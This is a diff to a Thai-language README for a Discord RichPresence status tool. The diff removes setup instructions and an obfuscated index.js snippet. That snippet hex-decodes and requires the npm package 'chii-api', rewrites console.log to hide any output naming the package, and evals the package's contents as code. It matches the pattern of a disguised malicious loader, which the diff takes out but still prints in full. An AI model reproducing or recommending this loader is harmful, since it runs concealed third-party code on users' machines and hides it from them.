@@ -7,66 +7,6 @@
 + 🟣ออกแบบมาเพื่อปรับแต่งชื่อโดยไม่ต้องปิดโค้ดแล้วรันใหม่
 + 🟣สถานะจะอัปเดตให้อัตโนมัติเมื่อมีการอัพเดทชื่อต่างๆในไฟล์ comfig.json
 
-## Installation
-+ ติดตั้ง Modules
-```sh
-npm install chii-api
-```
-## Run Code
-+ รันโค้ด
-```sh
-node index.js
-```
-+ How To Code index.js STATUS Discord RichPresence
-+ วิธีการเขียนโค้ด index.js สถานะ Discord RichPresence
-
-# สร้างไฟล์ชื่อ index.js
-```js
-function _0x458e(_0x3d7326, _0x3db6f8) {
-    const _0xc3702a = _0xc370();
-    return _0x458e = function (_0x458e36, _0x1257e2) {
-        _0x458e36 = _0x458e36 - 0x1e1;
-        let _0x4213e8 = _0xc3702a[_0x458e36];
-        return _0x4213e8;
-    }, _0x458e(_0x3d7326, _0x3db6f8);
-}
-function _0xc370() {
-    const _0x3aa8ea = [
-        '144FNwDVt', '3skqnTm', 'log', '1147004amDmiE', '2772360wixPWO'
-        , '678573urizmr', '3252690NFEpLS', 'includes', 'hex', '7220WeTJyp'
-        , 'from', 'apply', 'base64', '362900WJBULP', 'toString', 'Code\x20error'
-        , '636869692d617069', '50314OSMzsz', 'string', 'utf8'
-    ]; _0xc370 = function () { return _0x3aa8ea; };
-    return _0xc370();
-}
-const _0x4057e9 = _0x458e;
-(function (_0xeb9e0e, _0x1ca5c9) {
-    const _0x3d002b = _0x458e, _0x26438d = _0xeb9e0e();
-    while (!![]) {
-        try {
-            const _0x17c5ac = -parseInt(_0x3d002b(0x1e8)) / 0x1 + parseInt(_0x3d002b(0x1e4)) / 0x2 + -parseInt(_0x3d002b(0x1ec)) / 0x3 * (parseInt(_0x3d002b(0x1ee)) / 0x4) + -parseInt(_0x3d002b(0x1f4)) / 0x5 + -parseInt(_0x3d002b(0x1ef)) / 0x6 + -parseInt(_0x3d002b(0x1f1)) / 0x7 + parseInt(_0x3d002b(0x1eb)) / 0x8 * (parseInt(_0x3d002b(0x1f0)) / 0x9);
-            if (_0x17c5ac === _0x1ca5c9)
-                break;
-            else _0x26438d['push'](_0x26438d['shift']());
-        } catch (_0x3225c4) { _0x26438d['push'](_0x26438d['shift']()); }
-    }
-}(_0xc370, 0x42bcd)); const { log: originalLog } = require('console'), _0x5f44 = require(Buffer[_0x4057e9(0x1e1)](_0x4057e9(0x1e7), _0x4057e9(0x1f3))[_0x4057e9(0x1e5)](_0x4057e9(0x1ea))); console[_0x4057e9(0x1ed)] = function (_0x24bb19) {
-    const _0x1cf85f = _0x4057e9;
-    typeof _0x24bb19 === _0x1cf85f(0x1e9) && (_0x24bb19[_0x1cf85f(0x1f2)](_0x5f44) || _0x24bb19[_0x1cf85f(0x1f2)](Buffer[_0x1cf85f(0x1e1)](_0x5f44)[_0x1cf85f(0x1e5)](_0x1cf85f(0x1e3)))) ? originalLog(_0x1cf85f(0x1e6)) : originalLog[_0x1cf85f(0x1e2)](console, arguments);
-};
-const X1_ = Buffer['from'](_0x5f44)[_0x4057e9(0x1e5)]('base64'); eval(Buffer[_0x4057e9(0x1e1)](X1_, _0x4057e9(0x1e3))[_0x4057e9(0x1e5)](_0x4057e9(0x1ea)));
-const K2_ = ![];
-K2_ && console['log'](Buffer[_0x4057e9(0x1e1)](_0x5f44, _0x4057e9(0x1ea))[_0x4057e9(0x1e5)](_0x4057e9(0x1e3)));
-```
-
-# แพ็กเก็จเสร็ม package.json
-```js
-{
-  "dependencies": {
-    "chii-api": "^1.0.8"
-  }
-}
-```
 
 # การกำหนดชื่อสถานะสังเกตุที่ชื่อหัวข้อมัน
 + applicationId = "ไอดีของผู้ใช้งาน"
